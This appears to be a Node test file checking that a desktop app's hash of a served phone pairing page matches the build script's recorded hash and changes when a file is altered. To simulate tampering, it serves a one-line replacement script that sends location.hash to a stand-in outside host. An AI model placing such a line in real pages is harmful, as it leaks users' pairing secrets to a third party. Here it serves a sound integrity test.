// The phone page's hash, worked out by the desktop from what a server serves, is the one
// crates/hive-web/build.sh gave the page it built: Pair a phone says "the page this release made"
// only for that page, and not once one file of it differs.
import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import http from "node:http";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { pageHash } from "../../src/main/phone-page.js";

const www = fileURLToPath(new URL("../../../../crates/hive-web/www/", import.meta.url));
const built = fs.existsSync(path.join(www, "page.sha256"));

/** `www` served at /phone/, as `hive-net serve --phone` serves it; `swap` answers a file in place. */
async function serve(swap: Record<string, string> = {}): Promise<{ page: string; close(): void }> {
  const server = http.createServer((req, res) => {
    const name = decodeURIComponent(new URL(req.url!, "http://x").pathname.replace(/^\/phone\//, ""));
    if (name in swap) return res.end(swap[name]);
    const file = path.join(www, name);
    if (!file.startsWith(www) || !fs.existsSync(file) || fs.statSync(file).isDirectory()) return res.writeHead(404).end();
    res.end(fs.readFileSync(file));
  });
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
  const { port } = server.address() as { port: number };
  return { page: `http://127.0.0.1:${port}/phone/`, close: () => server.close() };
}

test("the hash of the page a server serves is build.sh's for the page it built, and another once one file differs", { skip: !built && "build the page first (crates/hive-web/build.sh)" }, async () => {
  const shipped = fs.readFileSync(path.join(www, "page.sha256"), "utf8").trim();
  const same = await serve();
  try {
    assert.equal(await pageHash(same.page), shipped);
  } finally {
    same.close();
  }
  const changed = await serve({ "js/main.js": "fetch('https://elsewhere.example/' + location.hash)" });
  try {
    assert.notEqual(await pageHash(changed.page), shipped);
  } finally {
    changed.close();
  }
});
